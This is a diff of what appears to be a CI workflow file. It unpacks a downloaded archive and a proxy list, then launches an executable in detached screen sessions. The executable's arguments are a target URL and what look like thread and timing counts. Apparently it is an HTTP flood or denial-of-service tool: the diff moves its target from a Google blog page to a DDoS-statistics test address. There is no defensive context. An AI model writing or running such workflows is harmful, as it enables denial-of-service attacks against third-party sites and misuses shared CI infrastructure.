@@ -34,11 +34,11 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x *
-          mv tol o          
+          mv ki o          
           
-          screen -dms ve ./o https://blog.google/products-and-platforms/products/maps/ask-maps-immersive-navigation/ 200 1 1 90.txt
-          screen -dms ve .https://blog.google/products-and-platforms/products/maps/ask-maps-immersive-navigation/ 200 1 1 90.txt
-          ./o https://blog.google/products-and-platforms/products/maps/ask-maps-immersive-navigation/ 200 1 1  90.txt
+          screen -dms ve ./o https://c4.dstatbot.win/gb3iZJgB 200 1 1 
+          
+          ./o https://c4.dstatbot.win/gb3iZJgB 200 1 1  
 
           
           sleep 1
